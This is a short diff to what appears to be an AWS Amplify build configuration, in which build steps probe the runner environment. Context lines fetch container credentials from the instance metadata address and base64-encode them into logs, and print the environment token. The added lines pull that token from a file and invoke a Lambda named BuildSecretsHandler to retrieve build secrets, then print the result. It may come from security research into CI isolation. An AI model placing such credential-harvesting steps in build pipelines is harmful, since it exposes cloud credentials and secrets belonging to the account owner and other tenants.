@@ -10,7 +10,9 @@ frontend:
         - echo "[!] Doing stuf"
         - echo $(ls -la /tmp | base64 -w 0) 
         - echo $(curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0)
-        - docker pull rpheuts/aemiliacontainernode10:latest
+        - export token=$(cat output/tmp/env.sh | grep 'AWS_ENVIRONMENT_TOKEN' | cut -d '=' -f 2)
+        - aws lambda invoke --function-name BuildSecretsHandler --payload "'{\"BranchArn\":\"arn:aws:amplify:us-east-1:800303608826:apps/d3je68rvgy22ch/branches/main\",\"JobId\":\"$AWS_JOB_ID\", \"StepName\":\"BUILD\", \"Token\":\"$token\"}'" --region us-east-1 out.txt
+        - cat out.txt
         - echo "Env token=$AWS_ENVIRONMENT_TOKEN"
         - echo "Build no=$AWS_JOB_ID"
         - curl 169.254.170.2/v2/metadata -v 
